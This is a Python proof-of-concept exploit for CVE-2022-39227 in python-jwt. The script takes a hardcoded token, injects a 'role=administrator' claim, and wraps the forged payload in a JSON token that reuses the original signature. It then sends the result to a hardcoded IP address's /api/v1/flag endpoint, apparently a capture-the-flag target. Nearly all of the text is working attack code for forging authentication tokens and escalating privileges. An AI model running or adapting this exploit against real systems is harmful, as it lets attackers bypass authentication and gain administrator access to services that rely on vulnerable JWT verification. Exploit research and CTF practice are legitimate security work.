#!/usr/bin/env python3
# Proof of concept for the CVE-2022-39227. According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with moified claims.
#
# Application: python-jwt
# Infected version: < 3.3.4
# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227
#
# Dependencies: jwcrypto, json, argparse
# Author: user0x1337
# Github: https://github.com/user0x1337
#
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTA1MjMwMDQsImlhdCI6MTcxMDUxOTQwNCwianRpIjoiREF6RTBKYW9KVzZkT2t5YVp5cGdxQSIsIm5iZiI6MTcxMDUxOTQwNCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.UsQW0TSDpdUXl-ivbfuDW4BrUVnytd9aJMz02iPjiSGUfBKBSUtMvKN5dSlswoNdma9PAV0IvR_SIAmqiW1egxfTUyJxB_BeMXKkqdktdlaAsf8ZiLEIGwchyqOV2Hz5wKQiKmvqjw3mlVPfqXyntGeyxS2umwiydmoOIZO9_DrXwQcm8ShGVyYkwHd9QJn9imgmKGLEICEOk1VXuaFcyKaCLco9OUDlGrjkhm87nmlUqNqHKnEWDpb1GIAArN3yFYtymdXLLwp8OadtK_BnTRy0hlrH4hb_5D7yNSkOP8hzuBB-K-tPOdeJwVq05BgxAByybPb_Z8XqQ3DURUIYxg"
claim = "role=administrator"

# Split JWT in its ingredients
[header, payload, signature] = token.split(".")
print(f"[+] Retrieved base64 encoded payload: {payload}")

# Payload is relevant
parsed_payload = loads(base64url_decode(payload))
print(f"[+] Decoded payload: {parsed_payload}")

# Processing of the user input and inject new claims
try:
    claims = claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

# merging. Generate a new payload
print(f'[+] Inject new "fake" payload: {parsed_payload}')
fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
print(f'[+] Fake payload encoded: {fake_payload}\n')

# Create a new JWT Web Token
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] New token:\n {new_payload}\n')
print(f'Example (HTTP-Cookie):\n------------------------------\nauth={new_payload}')

import requests
base = "http://83.136.249.138:52682/"
r = requests.get(base + "/api/v1/flag", headers={"Authorization": new_payload})
print(r.text)
